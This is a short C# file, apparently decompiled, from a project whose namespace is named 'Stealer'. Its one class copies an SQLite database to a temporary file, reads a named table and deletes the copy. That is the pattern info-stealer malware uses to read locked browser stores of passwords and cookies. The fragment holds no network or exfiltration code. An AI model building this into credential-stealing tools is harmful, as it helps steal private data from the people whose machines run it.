using System;
using System.IO;

namespace Stealer
{
	// Token: 0x02000003 RID: 3
	internal sealed class SqlReader
	{
		// Token: 0x06000009 RID: 9 RVA: 0x000024A4 File Offset: 0x000006A4
		public static SQLite ReadTable(string database, string table)
		{
			if (!File.Exists(database))
			{
				return null;
			}
			string text = Path.GetTempFileName() + ".dat";
			File.Copy(database, text);
			SQLite sqlite = new SQLite(text);
			sqlite.ReadTable(table);
			File.Delete(text);
			if (sqlite.GetRowCount() == 65536)
			{
				return null;
			}
			return sqlite;
		}
	}
}
